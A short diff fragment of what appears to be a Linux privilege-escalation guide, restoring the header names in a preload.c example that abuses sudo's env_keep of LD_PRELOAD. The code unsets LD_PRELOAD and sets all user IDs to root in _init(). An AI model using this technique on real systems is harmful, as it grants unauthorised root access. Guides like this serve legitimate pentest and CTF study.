@@ -16,9 +16,9 @@ Note that the env\_keep option includes the LD\_PRELOAD environment variable.
 
 Create a file (preload.c) with the following contents:
 
-`#include`\
-` #include`\
-` #include`\
+`#include <stdio.h>`\
+` #include <sys/types.h>`\
+` #include <stdlib.h>`\
 ` void _init() {`\
 ` unsetenv("LD_PRELOAD");`\
 ` setresuid(0,0,0);`\
